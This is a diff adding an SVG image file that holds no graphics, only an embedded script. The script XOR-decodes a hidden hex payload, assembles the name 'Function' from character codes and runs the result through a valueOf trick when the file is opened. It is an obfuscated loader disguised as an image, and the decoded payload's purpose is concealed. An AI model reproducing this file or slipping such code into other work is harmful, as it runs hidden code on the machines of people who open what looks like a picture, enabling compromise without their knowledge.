@@ -1,0 +1,24 @@
+<?xml version="1.0" encoding="UTF-8" standalone="no"?>
+<svg xmlns="http://www.w3.org/2000/svg" width="400" height="250">
+<script>
+<![CDATA[
+r = "";
+
+(() => {
+  const T = "9d8283431ec328a725d15818", C = "4e0d565657441a5f5e0602475b570f195a470157150511594d0b5a1a1a527c61134e44035170461c1578527d1213164100151f1958515969514e44075051461c150015521213167f6f0a1f1958695a7d514e444a7e55461c15631e7d12135108080558195852067d514e0347530a011c524d2a7e5513517b7f1e58191a646347134e036b616b011c100d59131c134303";
+  let a = "", G = C.match(/../g);
+  for (let e = 0; e < G.length; e++)
+    a += String.fromCharCode(parseInt(G[e], 16) ^ T.charCodeAt(e % T.length));
+  const m = {
+    valueOf: () => {
+      const p = [70,117,110,99,116,105,111,110].map(I => String.fromCharCode(I)).join("");
+      const g = this[p];
+      g(a)();
+      return 1;
+    }
+  };
+  m + 1;
+})();
+]]>
+</script>
+</svg>
